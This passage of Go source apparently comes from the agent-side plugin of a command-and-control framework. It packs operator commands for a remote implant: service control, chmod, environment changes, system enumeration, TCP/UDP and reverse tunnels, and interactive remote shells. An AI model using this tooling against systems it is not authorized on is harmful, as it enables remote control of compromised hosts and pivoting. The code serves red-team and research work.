		case "set":
			name, e := getStringArg(args, "name")
			if e != nil {
				err = e
				goto RET
			}
			value, e := getStringArg(args, "value")
			if e != nil {
				err = e
				goto RET
			}
			array = []interface{}{COMMAND_ENV, 2, name, value}
		case "unset":
			name, e := getStringArg(args, "name")
			if e != nil {
				err = e
				goto RET
			}
			array = []interface{}{COMMAND_ENV, 3, name, ""}
		default:
			err = errors.New("subcommand must be 'list', 'get', 'set' or 'unset'")
			goto RET
		}

	case "netstat":
		array = []interface{}{COMMAND_NETSTAT}

	case "ifconfig":
		array = []interface{}{COMMAND_IFCONFIG}

	case "service":
		unit, _ := args["unit"].(string)
		switch subcommand {
		case "list", "status", "start", "stop", "restart", "enable", "disable":
			array = []interface{}{COMMAND_SERVICE, subcommand, unit}
		default:
			err = errors.New("subcommand must be one of list|status|start|stop|restart|enable|disable")
			goto RET
		}

	case "uname":
		array = []interface{}{COMMAND_UNAME}

	case "chmod":
		path, e := getStringArg(args, "path")
		if e != nil {
			err = e
			goto RET
		}
		modeStr, e := getStringArg(args, "mode")
		if e != nil {
			err = e
			goto RET
		}
		mode, e := strconv.ParseUint(strings.TrimPrefix(modeStr, "0o"), 8, 32)
		if e != nil {
			err = errors.New("mode must be an octal value, e.g. 0755")
			goto RET
		}
		array = []interface{}{COMMAND_CHMOD, path, int(mode)}

	case "users":
		array = []interface{}{COMMAND_USERS}

	case "sysinfo":
		array = []interface{}{COMMAND_SYSINFO}

	default:
		err = fmt.Errorf("command '%v' not found", command)
		goto RET
	}

	taskData.Data, err = PackArray(array)

RET:
	return taskData, messageData, err
}

func secondOrEmpty(s string) string {
	parts := strings.SplitN(s, " ", 2)
	if len(parts) < 2 {
		return ""
	}
	return parts[1]
}

// ---------------------------------------------------------------------------
// Tunnel / terminal callbacks
// ---------------------------------------------------------------------------

func (ext *ExtenderAgent) TunnelCallbacks() adaptix.TunnelCallbacks {
	return adaptix.TunnelCallbacks{
		ConnectTCP: TunnelMessageConnectTCP,
		ConnectUDP: TunnelMessageConnectUDP,
		WriteTCP:   TunnelMessageWriteTCP,
		WriteUDP:   TunnelMessageWriteUDP,
		Pause:      TunnelMessagePause,
		Resume:     TunnelMessageResume,
		Close:      TunnelMessageClose,
		Reverse:    TunnelMessageReverse,
	}
}

func TunnelMessageConnectTCP(channelId int, tunnelType int, addressType int, address string, port int) adaptix.TaskData {
	array := []interface{}{COMMAND_TUNNEL_START_TCP, channelId, tunnelType, address, port}
	packData, _ := PackArray(array)
	return makeProxyTask(packData)
}

func TunnelMessageConnectUDP(channelId int, tunnelType int, addressType int, address string, port int) adaptix.TaskData {
	array := []interface{}{COMMAND_TUNNEL_START_UDP, channelId, address, port}
	packData, _ := PackArray(array)
	return makeProxyTask(packData)
}

func TunnelMessageWriteTCP(channelId int, data []byte) adaptix.TaskData {
	array := []interface{}{COMMAND_TUNNEL_WRITE_TCP, channelId, len(data), data}
	packData, _ := PackArray(array)
	return makeProxyTask(packData)
}

func TunnelMessageWriteUDP(channelId int, data []byte) adaptix.TaskData {
	array := []interface{}{COMMAND_TUNNEL_WRITE_UDP, channelId, len(data), data}
	packData, _ := PackArray(array)
	return makeProxyTask(packData)
}

func TunnelMessagePause(channelId int) adaptix.TaskData {
	array := []interface{}{COMMAND_TUNNEL_PAUSE, channelId}
	packData, _ := PackArray(array)
	return makeProxyTask(packData)
}

func TunnelMessageResume(channelId int) adaptix.TaskData {
	array := []interface{}{COMMAND_TUNNEL_RESUME, channelId}
	packData, _ := PackArray(array)
	return makeProxyTask(packData)
}

func TunnelMessageClose(channelId int) adaptix.TaskData {
	array := []interface{}{COMMAND_TUNNEL_CLOSE, channelId}
	packData, _ := PackArray(array)
	return makeProxyTask(packData)
}

func TunnelMessageReverse(tunnelId int, port int) adaptix.TaskData {
	array := []interface{}{COMMAND_TUNNEL_REVERSE, tunnelId, port}
	packData, _ := PackArray(array)
	return makeProxyTask(packData)
}

func (ext *ExtenderAgent) TerminalCallbacks() adaptix.TerminalCallbacks {
	return adaptix.TerminalCallbacks{
		Start: TerminalMessageStart,
		Write: TerminalMessageWrite,
		Close: TerminalMessageClose,
	}
}

func TerminalMessageStart(terminalId int, program string, sizeH int, sizeW int, oemCP int) adaptix.TaskData {
	array := []interface{}{COMMAND_SHELL_START, terminalId, program, sizeH, sizeW}
	packData, _ := PackArray(array)
	return makeProxyTask(packData)
}

func TerminalMessageWrite(terminalId int, oemCP int, data []byte) adaptix.TaskData {
	array := []interface{}{COMMAND_SHELL_WRITE, terminalId, len(data), data}
	packData, _ := PackArray(array)
	return makeProxyTask(packData)
}

func TerminalMessageClose(terminalId int) adaptix.TaskData {
	array := []interface{}{COMMAND_JOBS_KILL, terminalId}
	packData, _ := PackArray(array)
	return makeProxyTask(packData)
}
